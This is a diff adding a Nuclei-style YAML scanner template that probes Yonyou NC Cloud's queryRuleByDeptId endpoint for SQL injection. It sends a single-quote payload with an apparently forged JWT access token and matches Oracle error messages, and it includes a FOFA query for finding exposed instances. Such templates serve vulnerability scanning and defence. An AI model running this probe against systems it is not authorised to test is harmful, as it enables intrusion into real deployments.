@@ -1,0 +1,26 @@
+id: yonyou-nc-cloud-queryRuleByDeptId-sqli
+
+info:
+  name: 用友 NC Cloud queryRuleByDeptId - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+  tags: yonyou,sqli,nccloud,oa
+
+http:
+  - raw:
+      - |
+        GET /ncchr/attendcalendar/queryRuleByDeptId?orgId=1' HTTP/1.1
+        Host: {{Hostname}}
+        accessTokenNcc: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ
+
+    matchers:
+      - type: dsl
+        dsl:
+          - contains_all(body,"ORA-","SQL") && status_code==400
+          
